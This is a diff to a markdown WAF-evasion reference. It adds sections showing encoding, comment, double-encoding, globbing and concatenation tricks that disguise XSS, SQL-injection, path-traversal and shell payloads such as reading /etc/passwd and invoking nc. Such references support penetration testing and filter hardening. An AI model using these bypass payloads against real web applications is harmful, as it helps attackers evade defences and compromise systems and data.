@@ -1568,7 +1568,7 @@ script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0
 __1. URL Encoding__  
 - Encode normal payloads with % encoding/URL encoding.
 - Can be done with online tools like [this](https://www.url-encode-decode.com/).
-- Burp includes a in-built encodes/decoder.
+- Burp includes a in-built encoder/decoder.
 
 Blocked: `<svG/x=">"/oNloaD=confirm()//`  
 Bypassed: `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`
@@ -1577,40 +1577,79 @@ Blocked: `.0union(select 1,2,3,4,5,6,7,8,9,10,11,12)`
 Bypassed: `%2e%30%75%4e%49%4f%6e%28%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%29`
 
 __2. Unicode Encoding__  
-- 
+- Most modern web-apps support UTF-8.
+- ASCII characters in unicode encoding encoding provide great variants for bypassing.
+
+Standard: `prompt()`  
+Obfuscated: `pro\u006dpt()`
+
+Standard: `../../appusers.txt`  
+Obfuscated: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt`
+
+__BONUS:__  
+If the application allows alternate charset interpretation, i.e. if the web app interprets `а` or `ā` as `a`,. the attack vectors get more diverse.
+
+Standard: prompt()  
+Variant: рrомрt()
 
 __3. HTML Encoding__
--
+- Often web apps encode special characters into HTML encoding and render accordingly.
+- This leads us to basic bypass cases with HTML encoding (numeric/generic).
+
+Standard: `"><img src=x onerror=confirm()>`
+Encoded: `&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;` (General form)
+Encoded: `&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;` (Numeric reference)
 
 __4. Mixed Encoding__  
--
+- WAF rules often tend to filter out a single type of encoding.
+- This type of filters can be bypassed by mixed encoding payloads.
 
-__5. Wildcard Encoding__
+Standard: `<script/src=data;text/javascript, alert()></script>`
+Obfuscated: `<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74()></script>`
+
+__5. Using Comments__
+- Comments obfuscate standard payload vectors. 
+- Different payloads have different ways of obfuscation.
+
+Blocked: `<script>alert()</script>`
+Bypassed: `<!--><script>alert/**/()/**/</script>`
+
+Blocked: `/?id=1+union+select+1,2,3---`  
+Bypassed: `/?id=1+un/**/ion+sel/**/ect+1,2,3-`
+
+__6. Double Encoding__
+- Often WAF filters tend to encode characters to prevent attacks.
+- However poorly developed filters (no recursion filters) can be bypassed with double encoding.
+
+Standard: `http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\`
+Obfuscated: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\`
+
+Standard: `<script>alert('XSS')</script>`
+Obfuscated: `%253Cscript%253Ealert('XSS')%253C%252Fscript%253E`
+
+__7. Wildcard Encoding__
 - Globbing patterns are used by various command-line utilities to work with multiple files.
 - We can tweak them to execute system commands.
 - Specific to remote code execution vulnerabilities on linux systems.
 
-Blocked: `/bin/cat /etc/passwd`  
-Bypassed: `/???/??t /???/??ss??`  
+Standard: `/bin/cat /etc/passwd`  
+Obfuscated: `/???/??t /???/??ss??`  
 Used chars: `/ ? t s`
 
-Blocked: `/bin/nc 127.0.0.1 1337`  
-Bypassed: `/???/n? 2130706433 1337`  
+Standard: `/bin/nc 127.0.0.1 1337`  
+Obfuscated: `/???/n? 2130706433 1337`  
 Used chars: `/ ? n [0-9]`
 
-__6. Using Comments__
-- Comments obfuscate standard payload vectors. 
-- Different payloads have different ways of obfuscation.
+__8. String Concatenation__
+- Different programming languages have different syntaxes and patterns for concatenation.
+- This allows us to effectively generate payloads that can bypass many filters and rules.
 
-Blocked: `alert()`  
-Bypassed: `alert/**/()`
+Standard: `/bin/cat /etc/passwd`  
+Obfuscated: `/bi'n/c'at' /e'tc'/pa'''ss'wd`
+> Bash allows path concatenation for execution.
 
-Blocked: `/?id=1+un/**/ion+sel/**/ect+1,2,3--`  
-Bypassed: `/?id=1+union+select+1,2,3--`
-
-Blocked: 
-
-__7. 
+Standard: `<iframe/onload='this["src"]="javascript:alert()"';>`
+Obfuscated: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>`
 
 ### Browser Bugs:
 #### Charset Bugs:
